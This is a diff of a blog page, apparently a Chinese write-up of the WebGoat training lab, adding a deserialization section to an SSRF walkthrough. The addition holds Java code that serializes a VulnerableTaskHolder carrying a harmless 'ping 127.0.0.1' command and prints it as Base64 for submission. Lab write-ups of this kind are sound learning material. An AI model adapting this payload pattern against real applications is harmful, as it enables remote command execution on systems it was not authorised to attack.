@@ -9,7 +9,7 @@
     
     <title>
         
-            WebGoat靶场-SSRF |
+            WebGoat靶场-SSRF&amp;反序列化 |
         
         1diot9&#39;s Blog
     </title>
@@ -238,7 +238,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        WebGoat靶场-SSRF
+                        WebGoat靶场-SSRF&amp;反序列化
                     </div>
                 
 
@@ -272,7 +272,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon Jul 28 2025 10:15:29 GMT+0800">2025-07-28 10:15:29</span>
+                    <span class="datetime" data-updated="Mon Jul 28 2025 10:44:56 GMT+0800">2025-07-28 10:44:56</span>
                 </span>
             
         
@@ -305,7 +305,7 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>133 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>295 字</span>
             </span>
         
         
@@ -333,12 +333,14 @@
 
                     
                          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里考的异常简单，连常见的绕过手法和协议都没讲，感觉设计的不太完善。之后会再单独出一篇来学Java的SSRF。这里为了完整性，还是写一下。</p>
-<h1 id="第一题-第二题"><a href="#第一题-第二题" class="headerlink" title="第一题&amp;第二题"></a>第一题&amp;第二题</h1><p>第一题读内部数据，第二题向外发请求，基本一样。</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="第一题-第二题"><a href="#第一题-第二题" class="headerlink" title="第一题&amp;第二题"></a>第一题&amp;第二题</h2><p>第一题读内部数据，第二题向外发请求，基本一样。</p>
 <p><img   src="/WebGoat%E9%9D%B6%E5%9C%BA-SSRF/image-1753668905834.png"  alt="img"></p>
 <p>直接改url这里的就行。第二题整个替换掉就行。</p>
 <p>源码部分，这两题用的都是单纯的字符串匹配，实际上就不是真正的ssrf：</p>
 <p><img   src="/WebGoat%E9%9D%B6%E5%9C%BA-SSRF/image-1753668905869.png"  alt="img"></p>
-
+<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>这里要注意用webgoat给你提供的反序列化类org.dummy.insecure.framework.VulnerableTaskHolder</p>
+<p>然后windows下是没有sleep命令的，所以我这里用ping，ping 127.0.0.1就行，也能满足延迟。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.owasp.webgoat.lessons.deserialization.tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> org.dummy.insecure.framework.VulnerableTaskHolder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sleep</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] ser(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">VulnerableTaskHolder</span> <span class="variable">vul</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;webgoat&quot;</span>, <span class="string">&quot;ping 127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] ser = ser(vul);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(ser);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
                     
                 </div>
 
@@ -348,7 +350,7 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                WebGoat靶场-SSRF
+                WebGoat靶场-SSRF&amp;反序列化
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
@@ -460,7 +462,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98-%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">第一题&amp;第二题</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">2.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98-%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="nav-number">2.1.</span> <span class="nav-text">第一题&amp;第二题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">反序列化</span></a></li></ol>
     </div>
 </div>
 
@@ -502,7 +504,7 @@
             
                 <span class="count-item border-box word">
                     <span class="item-type border-box">总字数</span>
-                    <span class="item-value border-box word">33.7k</span>
+                    <span class="item-value border-box word">33.9k</span>
                 </span>
             
 
@@ -650,7 +652,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98-%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">第一题&amp;第二题</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">2.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98-%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="nav-number">2.1.</span> <span class="nav-text">第一题&amp;第二题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">反序列化</span></a></li></ol>
     </div>
 </div>
 
